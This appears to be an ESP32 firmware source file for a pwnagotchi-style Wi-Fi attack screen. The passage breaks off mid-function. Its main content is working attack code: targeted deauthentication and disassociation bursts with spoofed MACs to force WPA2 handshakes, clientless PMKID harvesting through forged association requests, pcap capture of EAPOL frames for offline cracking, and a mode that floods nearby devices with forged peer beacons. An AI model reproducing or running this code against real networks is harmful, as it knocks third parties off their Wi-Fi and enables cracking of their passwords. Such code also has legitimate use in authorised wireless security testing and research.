#include "WifiUnigotchiScreen.h"

#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "core/ConfigManager.h"
#include "utils/StorageUtil.h"
#include "utils/HackerHead.h"
#include "ui/actions/InputSelectAction.h"

#include <WiFi.h>
#include <cstring>
#include <cstdio>
#include <cstdlib>

// ── Static definitions ────────────────────────────────────────────────────────

const char* WifiUnigotchiScreen::SAVE_DIR = "/unigeek/wifi/eapol";
const char* WifiUnigotchiScreen::PWN_FILE = "/unigeek/wifi/pwngrid.txt";
const uint8_t WifiUnigotchiScreen::HOP_ORDER[HOP_COUNT] =
    {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};

WifiUnigotchiScreen::RawCapture WifiUnigotchiScreen::_ring[RING_SIZE] = {};
volatile int WifiUnigotchiScreen::_ringHead = 0;
volatile int WifiUnigotchiScreen::_ringTail = 0;

WifiUnigotchiScreen::ClientSight WifiUnigotchiScreen::_cring[CRING] = {};
volatile int WifiUnigotchiScreen::_cHead = 0;
volatile int WifiUnigotchiScreen::_cTail = 0;

std::unordered_map<WifiUnigotchiScreen::MacAddr, WifiUnigotchiScreen::EapolEntry,
                   WifiUnigotchiScreen::MacHash, WifiUnigotchiScreen::MacEqual>
    WifiUnigotchiScreen::_eapolMap = {};
std::unordered_map<WifiUnigotchiScreen::MacAddr, std::string,
                   WifiUnigotchiScreen::MacHash, WifiUnigotchiScreen::MacEqual>
    WifiUnigotchiScreen::_ssidMap = {};
std::unordered_map<WifiUnigotchiScreen::MacAddr, std::vector<std::vector<uint8_t>>,
                   WifiUnigotchiScreen::MacHash, WifiUnigotchiScreen::MacEqual>
    WifiUnigotchiScreen::_pending = {};
std::unordered_map<WifiUnigotchiScreen::MacAddr, std::vector<uint8_t>,
                   WifiUnigotchiScreen::MacHash, WifiUnigotchiScreen::MacEqual>
    WifiUnigotchiScreen::_beaconStore = {};

WifiUnigotchiScreen::ApTarget WifiUnigotchiScreen::_apTargets[MAX_TARGETS] = {};
int WifiUnigotchiScreen::_apCount = 0;

// ── PCAP structs ──────────────────────────────────────────────────────────────
#pragma pack(push, 1)
struct PcapGlobalHdr {
  uint32_t magic = 0xA1B2C3D4; uint16_t vmaj = 2; uint16_t vmin = 4;
  int32_t tz = 0; uint32_t sig = 0; uint32_t snap = 65535; uint32_t linktype = 105;
};
struct PcapPktHdr { uint32_t ts_sec; uint32_t ts_usec; uint32_t incl_len; uint32_t orig_len; };
#pragma pack(pop)

// ── EAPOL message parser (M1..M4) ──────────────────────────────────────────────
static int _parseEapolMsg(const uint8_t* data, uint16_t len) {
  static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  for (uint16_t i = 24; i + 16 <= len; i++) {
    bool match = true;
    for (int k = 0; k < 8; k++) { if (data[i + k] != snap[k]) { match = false; break; } }
    if (!match) continue;
    const uint8_t* e = data + i + 8;
    if (len < i + 8 + 49) return 0;
    if (e[1] != 0x03 || e[4] != 0x02) return 0;
    uint16_t ki = ((uint16_t)e[5] << 8) | e[6];
    bool ack = (ki & 0x0080), mic = (ki & 0x0100), secure = (ki & 0x0200);
    if (ack && !mic) return 1;          // M1
    if (ack &&  mic) return 3;          // M3
    if (!ack && mic) return secure ? 4 : 2;  // M4 sets the Secure bit, M2 doesn't (matches oink)
    return 0;
  }
  return 0;
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

WifiUnigotchiScreen::~WifiUnigotchiScreen() {
  _stopRadio();
  _eapolMap.clear(); _ssidMap.clear(); _pending.clear(); _beaconStore.clear();
  _apCount = 0; _ringHead = _ringTail = 0; _cHead = _cTail = 0;
}

void WifiUnigotchiScreen::onInit() {
  _eapolMap.clear(); _ssidMap.clear(); _pending.clear(); _beaconStore.clear();
  _apCount = 0; _ringHead = _ringTail = 0; _cHead = _cTail = 0;
  _handshakes = _pmkids = _deauths = _disassocs = _pwngridTx = 0;
  _resetPeers();
  _mode = MODE_PASSIVE; _auto = ST_RECON; _targetIdx = -1;
  _style = (Config.get(APP_CONFIG_UNIGOTCHI_STYLE, APP_CONFIG_UNIGOTCHI_STYLE_DEFAULT) == "text")
             ? STYLE_TEXT : STYLE_GOTCHI;
  _logCount = 0;
  _hopIdx = 0; _channel = HOP_ORDER[0];
  for (int i = 1; i < 6; i++) _spoofMac[i] = (uint8_t)random(256);
  _spoofMac[0] = 0x02;   // locally-administered, unicast
  _lastProbeMs = 0;

  const unsigned long now = millis();
  _sessionStart = now; _chanHopUntil = now + 500;
  _lastMoodMs = _lastFaceMs = now; _lastFreeCheck = 0;

  _storageOk = false;
  if (Uni.Storage && Uni.Storage->isAvailable() && StorageUtil::hasSpace()) {
    Uni.Storage->makeDir(SAVE_DIR);
    _storageOk = true;
  }

  _faceMood = MoodFace::HAPPY; _faceVariant = 0;
  strncpy(_curMsg, "Hi! I'm Unigotchi!", sizeof(_curMsg) - 1);
  _curMsg[sizeof(_curMsg) - 1] = '\0';
  _pushLog("Hi! I'm Unigotchi!");
  _firstRender = true; _dirty = D_ALL;

  _startRadio();
}

void WifiUnigotchiScreen::onRestore() { _firstRender = true; _dirty = D_ALL; render(); }

void WifiUnigotchiScreen::applyMode(uint8_t m) {
  _mode = (Mode)m;
  // Every mode except pure spam needs the receiver on (handshake capture, or
  // pwngrid peer detection). Spam only transmits.
  esp_wifi_set_promiscuous(_mode != MODE_PWNSPAM);
  _auto = ST_RECON; _targetIdx = -1;
  if (_mode == MODE_PWNGRID) {
    _resetPeers(); _loadPwnNames();
    _say(MoodFace::HAPPY, TFT_CYAN, "Let's make friends!");
  }
  else if (_mode == MODE_PWNSPAM) {
    _loadPwnNames();
    _say(MoodFace::EXCITED, TFT_CYAN, "Spamming the grid!");
  }
  else if (_mode == MODE_ACTIVE) _say(MoodFace::LOOKING, TFT_CYAN, "Hunting handshakes!");
  else _say(MoodFace::LOOKING, TFT_CYAN, MoodMsg::looking());
  _dirty |= D_TOP | D_STATS;
}

// ── Radio ─────────────────────────────────────────────────────────────────────

void WifiUnigotchiScreen::_startRadio() {
  _attacker = new WifiAttackUtil();
  _attacker->setChannel(_channel);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&WifiUnigotchiScreen::_promiscuousCb);
}
void WifiUnigotchiScreen::_stopRadio() {
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_promiscuous(false);
  if (_attacker) { delete _attacker; _attacker = nullptr; }
}

// ── Main loop ───────────────────────────────────────────────────────────────

void WifiUnigotchiScreen::onUpdate() {
  const unsigned long now = millis();

  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK) { Screen.goBack(); return; }
    if (dir == INavigation::DIR_PRESS) { _openOptionsMenu(); return; }
  }

  if (_mode == MODE_PWNGRID) {
    _drainPwngrid();   // parse peer advertisements captured by the promiscuous cb
    if (now >= _chanHopUntil) { _hopNext(); _pwngridAdvertise(_channel, false); }
    // Idle status reflects how many friends are currently nearby.
    if (now - _lastMoodMs > 6000) {
      char s[48];
      if (_friendsTot > 0) snprintf(s, sizeof(s), "%u friend%s nearby!",
                                    _friendsTot, _friendsTot == 1 ? "" : "s");
      else                 strcpy(s, "Looking for friends...");
      _say(_friendsTot > 0 ? MoodFace::HAPPY : MoodFace::LOOKING, TFT_CYAN, s);
    }
  } else if (_mode == MODE_PWNSPAM) {
    if (now >= _chanHopUntil) { _hopNext(); _pwngridAdvertise(_channel, true); }
  } else {
    _runHunt();
  }

  // Cycle to another face variant of the current mood for a little life.
  if (now - _lastFaceMs > 2500) {
    _lastFaceMs = now;
    _faceVariant++;   // _drawBody wraps it to the mood's variant count
    _dirty |= D_BODY;
  }

  // Idle: refresh the plain-text pwnagotchi status sentence (hunting modes only;
  // pwngrid and spam drive their own messages).
  if ((_mode == MODE_PASSIVE || _mode == MODE_ACTIVE) &&
      _auto == ST_RECON && now - _lastMoodMs > 7000)
    _say(MoodFace::LOOKING, TFT_CYAN, _statusSentence());

  // Uptime ticks on the top line.
  static unsigned long lastSec = 0;
  if (now - lastSec > 1000) { lastSec = now; _dirty |= D_TOP; }

  if (_dirty) onRender();
}

// PRESS opens this top-level options list; each entry drills into its own
// select box (Mode = what the engine does, Display = how it's drawn).
void WifiUnigotchiScreen::_openOptionsMenu() {
  static const InputSelectAction::Option opts[] = {
    {"Set Mode", "mode"}, {"Display Style", "style"} };
  const char* r = InputSelectAction::popup("Options", opts, 2, nullptr);
  if (r && strcmp(r, "mode") == 0)  { _openModeMenu();  return; }
  if (r && strcmp(r, "style") == 0) { _openStyleMenu(); return; }
  _firstRender = true; _dirty = D_ALL;
  render();   // repaint chrome + body over the dismissed box
}

void WifiUnigotchiScreen::_openModeMenu() {
  static const InputSelectAction::Option opts[] = {
    {"Passive Mode", "0"}, {"Active Mode", "1"},
    {"Pwngrid (friends)", "2"}, {"Pwngrid Spam", "3"} };
  char cur[2]; snprintf(cur, sizeof(cur), "%d", (int)_mode);
  const char* r = InputSelectAction::popup("Mode", opts, 4, cur);
  if (r) applyMode((uint8_t)atoi(r));
  _firstRender = true; _dirty = D_ALL;
  render();   // repaint chrome + body over the dismissed box
}

// Switch between the pwnagotchi face and the plain text log. Persisted so the
// preference sticks across sessions.
void WifiUnigotchiScreen::_openStyleMenu() {
  static const InputSelectAction::Option opts[] = {
    {"Gotchi (face)", "0"}, {"Text (log)", "1"} };
  char cur[2]; snprintf(cur, sizeof(cur), "%d", (int)_style);
  const char* r = InputSelectAction::popup("Display Style", opts, 2, cur);
  if (r) {
    _style = (DisplayStyle)atoi(r);
    Config.set(APP_CONFIG_UNIGOTCHI_STYLE, _style == STYLE_TEXT ? "text" : "gotchi");
    if (Uni.Storage) Config.save(Uni.Storage);
  }
  _firstRender = true; _dirty = D_ALL;
  render();
}

// ── State machine ─────────────────────────────────────────────────────────────

void WifiUnigotchiScreen::_hopNext() {
  _hopIdx  = (_hopIdx + 1) % HOP_COUNT;
  _channel = HOP_ORDER[_hopIdx];
  if (_attacker) _attacker->setChannel(_channel);
  // Passive has no deauth, so it must dwell long enough to catch an organic
  // handshake; active scans fast (it locks once a target appears); pwngrid sprays.
  unsigned long dwell = (_mode == MODE_PASSIVE) ? 2500
                      : (_mode == MODE_PWNGRID || _mode == MODE_PWNSPAM) ? 300 : 600;
  _chanHopUntil = millis() + dwell;
  _dirty |= D_TOP;   // CH is shown in the top line
}

int WifiUnigotchiScreen::_pickTarget() {
  const unsigned long now = millis();
  int best = -1; int bestScore = -1000;
  for (int i = 0; i < _apCount; i++) {
    if (_apTargets[i].attempted) continue;
    if (_apTargets[i].clientCount == 0) continue;
    if (now - _apTargets[i].lastClientMs > 12000) continue;
    int score = _apTargets[i].rssi + _apTargets[i].clientCount * 4;
    if (score > bestScore) { bestScore = score; best = i; }
  }
  if (best < 0) {
    static unsigned long lastReset = 0;
    if (now - lastReset > 30000) {
      for (int i = 0; i < _apCount; i++) _apTargets[i].attempted = false;
      lastReset = now;
    }
  }
  return best;
}

String WifiUnigotchiScreen::_ssidForIdx(int idx) {
  if (idx < 0 || idx >= _apCount) return String("(hidden)");
  MacAddr mac; memcpy(mac.data(), _apTargets[idx].bssid, 6);
  auto it = _ssidMap.find(mac);
  if (it != _ssidMap.end() && !it->second.empty()) return String(it->second.c_str());
  char b[18]; snprintf(b, sizeof(b), "%02X%02X%02X", _apTargets[idx].bssid[3],
                       _apTargets[idx].bssid[4], _apTargets[idx].bssid[5]);
  return String(b);
}

void WifiUnigotchiScreen::_runHunt() {
  const unsigned long now = millis();
  _flush();

  if (_mode == MODE_PASSIVE) {
    if (now >= _chanHopUntil) _hopNext();
    return;
  }

  switch (_auto) {
    case ST_RECON: {
      if (now >= _chanHopUntil) _hopNext();
      _probePmkid();   // active clientless PMKID harvesting while scanning
      int t = _pickTarget();
      if (t >= 0) {
        _targetIdx = t;
        _channel   = _apTargets[t].channel;
        if (_attacker) _attacker->setChannel(_channel);
        _auto = ST_LOCK; _stateUntil = now + 1200;
        _say(MoodFace::EXCITED, TFT_MAGENTA, MoodMsg::apSelected(_ssidForIdx(t)));
      }
      break;
    }
    case ST_LOCK:
      if (now >= _stateUntil) _auto = ST_ATTACK;
      break;
    case ST_ATTACK:
      // Fire ONE deauth burst, then go quiet and LISTEN. The client needs the
      // channel free to reconnect and complete the 4-way handshake — hammering
      // deauth the whole time would keep kicking it before it can finish.
      _hsAtAttack  = _handshakes;
      _attackTarget(true);
      _auto = ST_WAIT; _stateUntil = now + 15000; _reDeauthDone = false;  // 15 s window (oink)
      break;
    case ST_WAIT:
      // Success: a handshake landed (message already shown) — move on early.
      if (_handshakes != _hsAtAttack) {
        if (_targetIdx >= 0 && _targetIdx < _apCount) _apTargets[_targetIdx].attempted = true;
        _targetIdx = -1; _auto = ST_RECON; _chanHopUntil = now;
        break;
      }
      // One extra nudge at the mid-point if the first deauth was missed, then stay quiet.
      if (!_reDeauthDone && now >= _stateUntil - 4500) { _attackTarget(false); _reDeauthDone = true; }
      if (now >= _stateUntil) {
        if (_targetIdx >= 0 && _targetIdx < _apCount) {
          _apTargets[_targetIdx].attempted = true;
          _say(MoodFace::SAD, TFT_BLUE, MoodMsg::attackFailed(_ssidForIdx(_targetIdx)));
        }
        _targetIdx = -1; _auto = ST_RECON; _chanHopUntil = now;
      }
      break;
  }
}

void WifiUnigotchiScreen::_attackTarget(bool announce) {
  if (_targetIdx < 0 || _targetIdx >= _apCount) return;
  ApTarget& ap = _apTargets[_targetIdx];
  static const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

  for (uint8_t c = 0; c < ap.clientCount; c++) {
    // Burst of DEAUTH_BURST frames per client, bidirectional, with jitter (oink).
    for (uint8_t b = 0; b < DEAUTH_BURST; b++) {
      // AP -> client (spoof the AP), Reason 7 = class-3 frame from nonassoc STA
      _txMgmt(0xC0, ap.clients[c], ap.bssid, ap.bssid, 7); _deauths++;
      delayMicroseconds(random(700, 2400));
      // client -> AP (bidirectional — some stacks honor only one direction)
      _txMgmt(0xC0, ap.bssid, ap.clients[c], ap.bssid, 1); _deauths++;
      delayMicroseconds(random(700, 2400));
    }
    // disassoc the client, Reason 8 = STA leaving
    _txMgmt(0xA0, ap.clients[c], ap.bssid, ap.bssid, 8); _disassocs++;
    delayMicroseconds(random(700, 2400));
  }
  _txMgmt(0xC0, bcast, ap.bssid, ap.bssid, 7); _deauths++;
  delayMicroseconds(random(700, 2400));
  _txMgmt(0xA0, bcast, ap.bssid, ap.bssid, 8); _disassocs++;

  if (announce) _say(MoodFace::EXCITED, TFT_MAGENTA, MoodMsg::deauthing(_ssidForIdx(_targetIdx)));
  _dirty |= D_STATS;
}

void WifiUnigotchiScreen::_txMgmt(uint8_t subtype, const uint8_t* dst, const uint8_t* src,
                                  const uint8_t* bssid, uint8_t reason) {
  uint8_t f[26] = { subtype, 0x00, 0x3a, 0x01,
                    0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0,
                    0x00, 0x00, reason, 0x00 };
  memcpy(f + 4, dst, 6); memcpy(f + 10, src, 6); memcpy(f + 16, bssid, 6);
  esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
}

// Active (clientless) PMKID: send an 802.11 association request carrying an RSN
// IE (PSK/CCMP) so a WPA2 AP volunteers an EAPOL M1 with a PMKID, addressed to
// our spoofed STA MAC — captured by the promiscuous path like any other M1.
void WifiUnigotchiScreen::_sendAssocRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
  if (ssidLen == 0 || ssidLen > 32) return;
  uint8_t f[128]; size_t n = 0;
  f[n++] = 0x00; f[n++] = 0x00;                 // FC: mgmt, assoc request
  f[n++] = 0x00; f[n++] = 0x00;                 // duration
  memcpy(f + n, bssid, 6);     n += 6;          // addr1 = AP
  memcpy(f + n, _spoofMac, 6); n += 6;          // addr2 = our spoofed STA
  memcpy(f + n, bssid, 6);     n += 6;          // addr3 = BSSID
  f[n++] = 0x00; f[n++] = 0x00;                 // seq-ctl
  f[n++] = 0x31; f[n++] = 0x00;                 // capability: ESS + Privacy + ShortPreamble
  f[n++] = 0x0A; f[n++] = 0x00;                 // listen interval
  f[n++] = 0x00; f[n++] = ssidLen; memcpy(f + n, ssid, ssidLen); n += ssidLen;  // SSID IE
  static const uint8_t rates[] = {0x01,0x08,0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
  memcpy(f + n, rates, sizeof(rates)); n += sizeof(rates);
  // RSN IE: PSK / CCMP — prompts the AP to start the 4-way and emit M1 (with PMKID)
  static const uint8_t rsn[] = {
    0x30, 0x14, 0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x04,             // group cipher: CCMP
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, // pairwise: CCMP
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, // AKM: PSK
    0x00, 0x00 };                        // RSN capabilities
  memcpy(f + n, rsn, sizeof(rsn)); n += sizeof(rsn);
  esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
}

// Probe one not-yet-probed AP on the current channel (rate-limited) for its
// PMKID — no client required.
void WifiUnigotchiScreen::_probePmkid() {
  const unsigned long now = millis();
  if (now - _lastProbeMs < 150) return;
  for (int i = 0; i < _apCount; i++) {
    ApTarget& t = _apTargets[i];
    if (t.pmkidProbed || t.channel != (uint8_t)_channel) continue;
    MacAddr mac; memcpy(mac.data(), t.bssid, 6);
    auto it = _ssidMap.find(mac);
    if (it == _ssidMap.end() || it->second.empty()) continue;   // need the SSID
    _sendAssocRequest(t.bssid, it->second.c_str(), (uint8_t)it->second.size());
    t.pmkidProbed = true;
    _lastProbeMs = now;
    return;   // one probe per tick
  }
}

// ── Pwngrid: advertise our identity + detect nearby pwnagotchis ─────────────

void WifiUnigotchiScreen::_loadPwnNames() {
  _pwnNames.clear(); _pwnIdx = 0;
  if (Uni.Storage && Uni.Storage->isAvailable()) {
    fs::File f = Uni.Storage->open(PWN_FILE, FILE_READ);
    if (f) {
      while (f.available() && _pwnNames.size() < 64) {
        String l = f.readStringUntil('\n'); l.trim();
        if (l.length() && !l.startsWith("#")) _pwnNames.push_back(l);  // '#' = comment
      }
      f.close();
    }
  }
  if (_pwnNames.empty()) {
    // Seed a default file the user can edit on the SD card, then use it.
    static const char* def[] = { "unigeek" };
    if (Uni.Storage && Uni.Storage->isAvailable()) {
      Uni.Storage->makeDir("/unigeek/wifi");
      fs::File w = Uni.Storage->open(PWN_FILE, FILE_WRITE);
      if (w) {
        w.print("# Unigotchi pwngrid name — the first non-comment line below is\n");
        w.print("# advertised as this unit's name so other pwnagotchis see you as\n");
        w.print("# a friend. Lines starting with # and blank lines are ignored.\n");
        for (auto s : def) { w.print(s); w.print('\n'); }
        w.close();
      }
    }
    for (auto s : def) _pwnNames.push_back(String(s));
  }
  _pwnLoaded = true;
}

void WifiUnigotchiScreen::_pwngridAdvertise(uint8_t ch, bool spam) {
  if (!_pwnLoaded) _loadPwnNames();
  static const uint8_t hdr[] = {
    0x80, 0x00, 0x00, 0x00, 0xff,0xff,0xff,0xff,0xff,0xff,
    0xde,0xad,0xbe,0xef,0xde,0xad, 0xa1,0x00,0x64,0xe6,0x0b,0x8b,
    0x40,0x43, 0,0,0,0,0,0,0,0, 0x64,0x00, 0x11,0x04 };
  static const char* faces[] = { "(o_o)", "(>_<)", "(^_^)", "(-_-)", "(x_x)" };

  // Friends mode: one stable name/identity so peers count us as a single friend.
  // Spam mode: cycle through every name in the SD list to flood the grid.
  String name = _pwnNames.empty() ? String("unigeek")
              : spam              ? _pwnNames[_pwnIdx % _pwnNames.size()]
                                  : _pwnNames[0];
  const char* face = faces[_pwnIdx % 5];   // face still cycles for a little life
  _pwnIdx++;

  // JSON-escape the name (quotes/backslashes) so the beacon payload stays valid.
  String esc; esc.reserve(name.length() + 8);
  for (size_t i = 0; i < name.length(); i++) {
    char c = name[i];
    if (c == '"' || c == '\\') esc += '\\';
    if ((uint8_t)c >= 0x20) esc += c;
  }

  char json[220];
  int jl = snprintf(json, sizeof(json),
    "{\"pal\":true,\"name\":\"%s\",\"face\":\"%s\",\"epoch\":1,"
    "\"grid_version\":\"1.10.3\",\"identity\":\"unigeek-unigotchi\","
    "\"pwnd_run\":%lu,\"pwnd_tot\":%lu,\"session_id\":\"a2:00:64:e6:0b:8b\","
    "\"timestamp\":0,\"uptime\":%lu,\"version\":\"1.8.4\"}",
    esc.c_str(), face, (unsigned long)_handshakes, (unsigned long)_handshakes,
    (unsigned long)((millis() - _sessionStart) / 1000));
  if (jl <= 0) return;
  if (jl > (int)sizeof(json) - 1) jl = sizeof(json) - 1;

  uint8_t frame[sizeof(hdr) + 2 + 220];
  size_t n = sizeof(hdr); memcpy(frame, hdr, n);
  for (int i = 0; i < jl; i++) {
    if (i % 255 == 0) { frame[n++] = 0xDE; frame[n++] = (jl - i < 255) ? (uint8_t)(jl - i) : 255; }
    frame[n++] = (uint8_t)json[i];
  }
  if (_attacker) _attacker->setChannel(ch);
  esp_wifi_80211_tx(WIFI_IF_AP, frame, n, false);
  _pwngridTx++;

  if (spam) {
    char buf[40]; snprintf(buf, sizeof(buf), "TX: %s", name.c_str());
    if (millis() - _lastMoodMs > 1500) _say(MoodFace::HAPPY, TFT_CYAN, buf);
  }
  _dirty |= D_STATS;
}

// ── Pwngrid peer detection (real mesh protocol) ─────────────────────────────

void WifiUnigotchiScreen::_resetPeers() {
  for (auto& p : _peers) p.used = false;
  _peerCount = 0; _friendsTot = 0; _lastFriend[0] = '\0'; _lastPeerScan = 0;
}

// Pull a string value ("key":"value") out of a flat JSON payload — no library.
bool WifiUnigotchiScreen::_jsonStr(const char* json, const char* key, char* out, size_t outSz) {
  char pat[40]; snprintf(pat, sizeof(pat), "\"%s\"", key);
  const char* p = strstr(json, pat);
  if (!p) return false;
  p = strchr(p + strlen(pat), ':');
  if (!p) return false;
  p++;
  while (*p == ' ' || *p == '\t') p++;
  if (*p != '"') return false;
  p++;
  size_t o = 0;
  while (*p && *p != '"' && o < outSz - 1) {
    if (*p == '\\' && p[1]) p++;   // skip the escape, copy the escaped char
    out[o++] = *p++;
  }
  out[o] = '\0';
  return true;
}

// Pull a numeric value ("key":number) out of a flat JSON payload.
long WifiUnigotchiScreen::_jsonInt(const char* json, const char* key) {
  char pat[40]; snprintf(pat, sizeof(pat), "\"%s\"", key);
  const char* p = strstr(json, pat);
  if (!p) return -1;
  p = strchr(p + strlen(pat), ':');
  if (!p) return -1;
  p++;
  while (*p == ' ' || *p == '\t') p++;
  return atol(p);
}

// Decode a pwnagotchi advertisement beacon and register/refresh the peer.
void WifiUnigotchiScreen::_parsePwnBeacon(const uint8_t* data, uint16_t len, int8_t rssi) {
  if (len <= 38) return;

  // Payload sits after the beacon header (offset 36) + AC element header.
  // Keep only printable ASCII — this also drops the 0xDE/length AC markers that
  // are interleaved every 255 bytes, leaving clean JSON text.
  char json[384];
  size_t j = 0;
  for (uint16_t i = 38; i < len && j < sizeof(json) - 1; i++) {
    uint8_t c = data[i];
    if (c >= 0x20 && c < 0x7F) json[j++] = (char)c;
  }
  json[j] = '\0';

  const char* start = strchr(json, '{');
  if (!start) return;

  char identity[65] = {0}, name[24] = {0}, face[12] = {0};
  if (!_jsonStr(start, "identity", identity, sizeof(identity))) {
    // Some units omit identity — fall back to the name as the dedupe key.
    if (!_jsonStr(start, "name", identity, sizeof(identity))) return;
  }
  _jsonStr(start, "name", name, sizeof(name));
  _jsonStr(start, "face", face, sizeof(face));
  long pt = _jsonInt(start, "pwnd_tot");

  _addPeer(identity, name[0] ? name : "?", face, pt < 0 ? 0 : (uint32_t)pt, rssi);
}

void WifiUnigotchiScreen::_addPeer(const char* identity, const char* name,
                                   const char* face, uint32_t pwndTot, int8_t rssi) {
  const unsigned long now = millis();

  // Known peer — refresh liveness and stats.
  for (int i = 0; i < _peerCount; i++) {
    if (_peers[i].used && strcmp(_peers[i].identity, identity) == 0) {
      _peers[i].lastPing = now;
      _peers[i].rssi     = rssi;
      _peers[i].pwndTot  = pwndTot;
      strncpy(_peers[i].name, name, sizeof(_peers[i].name) - 1);
      strncpy(_peers[i].face, face, sizeof(_peers[i].face) - 1);
      return;
    }
  }

  // New friend — claim a free slot.
  int slot = -1;
  for (int i = 0; i < MAX_PEERS; i++) if (!_peers[i].used) { slot = i; break; }
  if (slot < 0) return;

  PwnPeer& p = _peers[slot];
  memset(&p, 0, sizeof(p));
  strncpy(p.identity, identity, sizeof(p.identity) - 1);
  strncpy(p.name,     name,     sizeof(p.name)     - 1);
  strncpy(p.face,     face,     sizeof(p.face)     - 1);
  p.pwndTot  = pwndTot;
  p.rssi     = rssi;
  p.lastPing = now;
  p.used     = true;
  if (slot >= _peerCount) _peerCount = slot + 1;
  _friendsTot++;
  strncpy(_lastFriend, name, sizeof(_lastFriend) - 1);

  if (Uni.Speaker) Uni.Speaker->playNotification();
  char msg[64];
  snprintf(msg, sizeof(msg), "New friend: %s %s", name, face[0] ? face : "");
  _say(MoodFace::EXCITED, TFT_MAGENTA, msg);
  _dirty |= D_STATS;
}

void WifiUnigotchiScreen::_expirePeers() {
  const unsigned long now = millis();
  bool changed = false;
  for (int i = 0; i < _peerCount; i++) {
    if (_peers[i].used && (now - _peers[i].lastPing) > PEER_AWAY_MS) {
      _peers[i].used = false;
      if (_friendsTot) _friendsTot--;
      changed = true;
    }
  }
  if (changed) {
    int hi = 0;
    for (int i = 0; i < MAX_PEERS; i++) if (_peers[i].used) hi = i + 1;
    _peerCount = hi;
    _dirty |= D_STATS;
  }
}

// Drain the shared capture ring, parsing only pwnagotchi advertisement beacons
// (source MAC de:ad:be:ef:de:ad). Runs in pwngrid mode in place of _flush().
void WifiUnigotchiScreen::_drainPwngrid() {
  static const uint8_t sig[6] = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad};
  while (_ringTail != _ringHead) {
    const RawCapture& cap = _ring[_ringTail];
    _ringTail = (_ringTail + 1) % RING_SIZE;
    if (!cap.isBeacon || cap.len < 39) continue;
    if (memcmp(cap.data + 10, sig, 6) != 0) continue;   // addr2 = source MAC
    _parsePwnBeacon(cap.data, cap.len, cap.rssi);
  }
  const unsigned long now = millis();
  if (now - _lastPeerScan > 3000) { _lastPeerScan = now; _expirePeers(); }
}

// ── Capture engine ────────────────────────────────────────────────────────────

bool WifiUnigotchiScreen::_checkFreeSpace() {
  if (!_storageOk) return false;
  const unsigned long now = millis();
  if (now - _lastFreeCheck < 5000) return true;
  _lastFreeCheck = now;
  if (!StorageUtil::hasSpace()) { _storageOk = false; return false; }
  return true;
}

std::string WifiUnigotchiScreen::_sanitize(const std::string& s) {
  std::string out; out.reserve(s.size());
  for (char c : s) {
    if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
        (c >= '0' && c <= '9') || c == '-' || c == '.') out += c; else out += '_';
  }
  return out;
}
std::string WifiUnigotchiScreen::_makePath(const MacAddr& bssid, const std::string& ssid) {
  char mac[13]; snprintf(mac, sizeof(mac), "%02X%02X%02X%02X%02X%02X",
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  std::string safe = _sanitize(ssid); if (safe.empty()) safe = "unknown";
  return std::string(SAVE_DIR) + "/" + mac + "_" + safe + ".pcap";
}
void WifiUnigotchiScreen::_writePcapHeader(const std::string& path) {
  if (!_checkFreeSpace()) return;
  fs::File f = Uni.Storage->open(path.c_str(), FILE_WRITE); if (!f) return;
  PcapGlobalHdr hdr; f.write(reinterpret_cast<uint8_t*>(&hdr), sizeof(hdr)); f.close();
}
void WifiUnigotchiScreen::_appendPcapFrame(const std::string& path, const uint8_t* data, uint16_t len) {
  if (!_checkFreeSpace()) return;
  fs::File f = Uni.Storage->open(path.c_str(), FILE_APPEND); if (!f) return;
  PcapPktHdr ph; const unsigned long ms = millis();
  ph.ts_sec = ms / 1000; ph.ts_usec = (ms % 1000) * 1000; ph.incl_len = len; ph.orig_len = len;
  f.write(reinterpret_cast<uint8_t*>(&ph), sizeof(ph)); f.write(data, len); f.close();
}

bool WifiUnigotchiScreen::_extractPmkid(const uint8_t* data, uint16_t len) {
  static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  int so = -1;
  for (uint16_t i = 24; i + 16 <= len; i++) {
    bool m = true; for (int k = 0; k < 8; k++) if (data[i + k] != snap[k]) { m = false; break; }
    if (m) { so = i; break; }
  }
  if (so < 0) return false;
  const uint8_t* e = data + so + 8;
  if (len < (uint16_t)(so + 8 + 99)) return false;
  uint16_t kdLen = ((uint16_t)e[97] << 8) | e[98];
  const uint8_t* kd = e + 99;
  if ((so + 8 + 99 + kdLen) > len) kdLen = len - (so + 8 + 99);
  for (uint16_t i = 0; i + 6 + 16 <= kdLen; i++) {
    if (kd[i] == 0xDD && kd[i+2] == 0x00 && kd[i+3] == 0x0F && kd[i+4] == 0xAC && kd[i+5] == 0x04) {
      bool z = true; for (int q = 0; q < 16; q++) if (kd[i+6+q]) { z = false; break; }
      return !z;
    }
  }
  return false;
}

int WifiUnigotchiScreen::_updateValidation(EapolEntry& entry, const uint8_t* data, uint16_t len) {
  static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  if (len < 40) return 0;
  int so = -1;
  for (uint16_t i = 24; i + 16 <= len; i++) {
    bool m = true; for (int k = 0; k < 8; k++) if (data[i + k] != snap[k]) { m = false; break; }
    if (m) { so = i; break; }
  }
  if (so < 0) return 0;
  const uint8_t* e = data + so + 8;
  if (len < (uint16_t)(so + 8 + 49)) return 0;
